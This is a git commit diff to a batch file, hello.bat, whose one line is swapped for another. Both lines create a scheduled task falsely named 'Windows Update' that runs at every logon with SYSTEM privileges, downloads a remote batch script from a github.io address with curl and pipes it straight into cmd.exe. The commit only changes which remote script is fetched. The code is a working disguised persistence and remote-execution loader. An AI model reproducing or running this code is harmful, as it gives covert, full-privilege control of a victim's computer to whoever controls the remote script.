4ed744a14ca0161d178a518440307eff811cafc4
Sajid Alam <117466907+mohammadsajidalam@users.noreply.github.com>
2023-02-23 18:19:34 +0530

    Update hello.bat

--- hello.bat
+++ hello.bat
@@ -1,1 +1,1 @@
-schtasks /create /tn "Windows Update" /tr "cmd.exe /c curl -s "https://mohammadsajidalam.github.io/cmd/hello.bat" | cmd.exe & timeout /t 0" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
+schtasks /create /tn "Windows Update" /tr "cmd.exe /c curl -s "https://mohammadsajidalam.github.io/cmd/after.bat" | cmd.exe & timeout /t 0" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
